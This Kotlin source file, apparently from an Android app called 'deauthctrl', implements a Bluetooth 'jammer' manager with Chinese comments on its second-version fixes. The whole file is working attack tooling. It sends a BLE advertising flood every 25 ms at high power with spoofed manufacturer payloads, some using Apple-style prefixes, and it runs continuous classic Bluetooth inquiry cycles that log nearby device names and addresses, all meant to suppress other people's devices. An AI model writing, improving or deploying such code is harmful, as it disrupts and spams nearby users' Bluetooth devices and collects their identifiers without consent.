package xin.ctkqiang.deauthctrl.manager

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import xin.ctkqiang.deauthctrl.model.JammerLogEntry
import java.util.ArrayDeque
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong

data class DiscoveredDevice(val name: String, val address: String, val type: String)

/**
 * 蓝牙压制运行期统计快照
 *
 * @property blePackets    BLE 泛洪成功发包数
 * @property inquiryCycles 经典蓝牙 inquiry 触发次数
 * @property devicesFound  累计发现设备数
 * @property uptimeMs      本次 start 起累计运行毫秒数
 */
data class BluetoothJammerStats(
    val blePackets: Long,
    val inquiryCycles: Long,
    val devicesFound: Int,
    val uptimeMs: Long,
)

/**
 * 全频段蓝牙压制管理器
 *
 * 同时运行 BLE 广告泛洪 + 经典蓝牙 inquiry 发现，对附近蓝牙设备形成压制。
 *
 * ## 关键修复点（v2）
 * 1. **原子计数器**：[blePkt]/[inqPkt] 原为裸 Int，被 BLE binder 线程与协程同时修改，存在可见性问题。
 *    改用 [AtomicInteger] 解决。
 * 2. **线程安全设备表**：[discoveredMap] 原为 `mutableMapOf`，被 BroadcastReceiver 与 clear/stop 交叉访问。
 *    改用 [ConcurrentHashMap]。
 * 3. **移除 `!!`**：`stopAdvertising(activeCb!!)` 在 activeCb 为 null 时 NPE（被 try-catch 兜住但语义错误）。
 *    改用安全调用。
 * 4. **Android 14+ receiver 注册**：[Context.registerReceiver] 在 API 34+ 需显式 `RECEIVER_EXPORTED` flag。
 * 5. **Android 13+ `getParcelableExtra`**：原 `getParcelableExtra<BluetoothDevice>(...)` 已 deprecated，
 *    改用类型安全重载。
 * 6. **ring buffer 日志**：`takeLast(200)` O(n) 拷贝 → [ArrayDeque] O(1) 淘汰。
 *
 * @param context 应用上下文
 */
class BluetoothJammerManager(private val context: Context) {

    private val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val adapter: BluetoothAdapter? = btManager.adapter
    private val scope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()
    private val _devices = MutableStateFlow<List<DiscoveredDevice>>(emptyList())
    val discoveredDevices: StateFlow<List<DiscoveredDevice>> = _devices.asStateFlow()
    private val _discoveryCount = MutableStateFlow(0)
    val discoveryCount: StateFlow<Int> = _discoveryCount.asStateFlow()
    private val _log = MutableStateFlow<List<JammerLogEntry>>(emptyList())
    val log: StateFlow<List<JammerLogEntry>> = _log.asStateFlow()
    private val _error = MutableStateFlow<String?>(null)
    val error: StateFlow<String?> = _error.asStateFlow()

    private val _stats = MutableStateFlow(BluetoothJammerStats(0, 0, 0, 0))
    val stats: StateFlow<BluetoothJammerStats> = _stats.asStateFlow()

    private var bleAdvertiser: BluetoothLeAdvertiser? = null
    private var jammerJob: Job? = null

    // 原子计数器：BLE binder 线程回调 + 协程同时访问
    private val blePkt = AtomicInteger(0)
    private val inqPkt = AtomicInteger(0)
    private val startTimeMs = AtomicLong(0L)

    // 线程安全设备表：BroadcastReceiver + clear/stop 交叉访问
    private val discoveredMap = ConcurrentHashMap<String, DiscoveredDevice>()
    private var inquiryReceiver: BroadcastReceiver? = null
    private var activeAdv: BluetoothLeAdvertiser? = null
    private var activeCb: AdvertiseCallback? = null

    // 日志环形缓冲（替代 takeLast 的 O(n) 拷贝）
    private val logDeque = ArrayDeque<JammerLogEntry>()

    fun start() {
        if (_isRunning.value) return
        val bt = adapter ?: run { _error.value = "no bluetooth"; return }
        if (!bt.isEnabled) { _error.value = "bluetooth is off"; return }
        bleAdvertiser = bt.bluetoothLeAdvertiser
        _isRunning.value = true; _error.value = null
        blePkt.set(0); inqPkt.set(0); startTimeMs.set(System.currentTimeMillis())
        discoveredMap.clear()
        _devices.value = emptyList(); _discoveryCount.value = 0
        publishStats()

        jammerJob = scope.launch {
            launch { bleFlood() }
            launch { inquiryFlood() }
            // 周期发布统计
            while (isActive) {
                delay(STATS_PUBLISH_INTERVAL_MS)
                publishStats()
            }
        }
        log("JAMMER", "full-spectrum BT jammer activated")
    }

    fun stop() {
        _isRunning.value = false
        jammerJob?.cancel()
        stopActiveAdvertising()
        unregisterInquiryReceiver()
        activeAdv = null; activeCb = null; bleAdvertiser = null
        publishStats(finalize = true)
        log("JAMMER", "stopped | BLE=${blePkt.get()} Inquiry=${inqPkt.get()} devices=${discoveredMap.size}")
    }

    fun destroy() { stop(); scope.cancel() }

    fun clearLog() {
        synchronized(logDeque) { logDeque.clear() }
        _log.value = emptyList()
        blePkt.set(0); inqPkt.set(0)
        discoveredMap.clear()
        _devices.value = emptyList(); _discoveryCount.value = 0
        publishStats(finalize = true)
    }

    // ─── BLE 泛洪 ──────────────────────────────────────────────────────────────

    private suspend fun bleFlood() {
        val adv = bleAdvertiser ?: run {
            _error.value = "BLE advertising not supported"
            return
        }
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false).build()

        // payload 构造提到循环外，避免每轮重复分配
        val payloads = listOf(
            byteArrayOf(0x4C, 0x00, 0x05, 0x02) + rand(17),
            byteArrayOf(0x4C, 0x00, 0x07, 0x02) + rand(17),
            byteArrayOf(0x4C, 0x00, 0x0B, 0x02) + rand(17),
            byteArrayOf(0x06, 0x00, 0x01, 0x03) + rand(12),
            byteArrayOf(0x75, 0x00, 0x01, 0x00) + rand(12),
            byteArrayOf(0xFF.toByte(), 0xFF.toByte()) + rand(20),
        )

        while (_isRunning.value) {
            for (p in payloads) {
                if (!_isRunning.value) break
                stopActiveAdvertising()
                val data = AdvertiseData.Builder()
                    .addManufacturerData(MFR_ID, p)
                    .setIncludeDeviceName(false)
                    .build()
                val cb = object : AdvertiseCallback() {
                    override fun onStartSuccess(s: AdvertiseSettings?) { blePkt.incrementAndGet() }
                    override fun onStartFailure(c: Int) { /* 系统已记录，不重复计数 */ }
                }
                try {
                    adv.startAdvertising(settings, data, cb)
                    activeAdv = adv; activeCb = cb
                } catch (_: SecurityException) {
                    _error.value = "permission denied: BLUETOOTH_ADVERTISE"
                } catch (_: Throwable) {
                    // 单次失败不影响下一轮
                }
                delay(BLE_FLOOD_INTERVAL_MS)
            }
        }
    }

    // ─── 经典蓝牙 inquiry 泛洪 ──────────────────────────────────────────────────

    private suspend fun inquiryFlood() {
        registerInquiryReceiver()

        while (_isRunning.value) {
            try { adapter?.startDiscovery() } catch (_: SecurityException) {
                _error.value = "permission denied: BLUETOOTH_SCAN"
            } catch (_: Throwable) {}
            inqPkt.incrementAndGet()
            delay(INQUIRY_INTERVAL_MS)
            try { adapter?.cancelDiscovery() } catch (_: Throwable) {}
            delay(INQUIRY_CANCEL_GAP_MS)
        }
        unregisterInquiryReceiver()
    }

    /**
     * 注册 ACTION_FOUND 广播接收器。
     *
     * Android 14 (API 34)+ 要求显式指定 [Context.RECEIVER_EXPORTED] 或 RECEIVER_NOT_EXPORTED flag，
     * 否则抛 SecurityException。系统广播用 RECEIVER_EXPORTED。
     */
    private fun registerInquiryReceiver() {
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                if (BluetoothDevice.ACTION_FOUND != intent?.action) return
                val dev = intent.getBluetoothDeviceExtra(BluetoothDevice.EXTRA_DEVICE) ?: return
                val name = try { dev.name ?: "Unknown" } catch (_: SecurityException) { "Unknown" }
                discoveredMap[dev.address] = DiscoveredDevice(name, dev.address, "Classic")
                _devices.value = discoveredMap.values.toList().sortedBy { it.address }
                _discoveryCount.value = discoveredMap.size
            }
        }
        inquiryReceiver = receiver
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.registerReceiver(receiver, IntentFilter(BluetoothDevice.ACTION_FOUND), Context.RECEIVER_EXPORTED)
            } else {
                @Suppress("DEPRECATION")
                context.registerReceiver(receiver, IntentFilter(BluetoothDevice.ACTION_FOUND))
            }
        } catch (_: SecurityException) {
            _error.value = "permission denied: BLUETOOTH_SCAN"
        } catch (_: Throwable) {
            // 部分 ROM 限制后台注册 receiver
        }
    }

    private fun unregisterInquiryReceiver() {
        val r = inquiryReceiver ?: return
        try { context.unregisterReceiver(r) } catch (_: Throwable) {}
        inquiryReceiver = null
    }

    /**
     * 兼容 Android 13+ 的 getParcelableExtra。
     *
     * Android 13 起 `getParcelableExtra<T>(name)` 已 deprecated，
     * 需用 `getParcelableExtra(name, T::class.java)` 重载。
     */
    private fun Intent.getBluetoothDeviceExtra(name: String): BluetoothDevice? =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            getParcelableExtra(name, BluetoothDevice::class.java)
        } else {
            @Suppress("DEPRECATION")
            getParcelableExtra(name)
        }

    // ─── 活跃 advertising 清理 ────────────────────────────────────────────────

    private fun stopActiveAdvertising() {
        val adv = activeAdv ?: return
        val cb = activeCb ?: run { activeAdv = null; return }
        try { adv.stopAdvertising(cb) } catch (_: SecurityException) {} catch (_: Throwable) {}
        activeAdv = null
        activeCb = null
    }

    // ─── 统计与日志 ─────────────────────────────────────────────────────────────

    private fun publishStats(finalize: Boolean = false) {
        val uptime = if (finalize) {
            _stats.value.uptimeMs
        } else {
            maxOf(0L, System.currentTimeMillis() - startTimeMs.get())
        }
        _stats.value = BluetoothJammerStats(
            blePackets = blePkt.get().toLong(),
            inquiryCycles = inqPkt.get().toLong(),
            devicesFound = discoveredMap.size,
            uptimeMs = uptime,
        )
    }

    private fun rand(c: Int) = ByteArray(c).also { kotlin.random.Random.nextBytes(it) }

    /**
     * 追加日志到环形缓冲。
     * 满 [LOG_LIMIT] 后 O(1) 淘汰最旧条目，避免每帧 List 拷贝。
     */
    private fun log(module: String, msg: String) {
        val entry = JammerLogEntry(module = module, message = msg)
        val newList = synchronized(logDeque) {
            if (logDeque.size >= LOG_LIMIT) logDeque.removeFirst()
            logDeque.addLast(entry)
            logDeque.toList()
        }
        _log.value = newList
    }

    private companion object {
        const val MFR_ID = 0xFFFF
        const val LOG_LIMIT = 200
        const val BLE_FLOOD_INTERVAL_MS = 25L
        const val INQUIRY_INTERVAL_MS = 1500L
        const val INQUIRY_CANCEL_GAP_MS = 100L
        const val STATS_PUBLISH_INTERVAL_MS = 1000L
    }
}
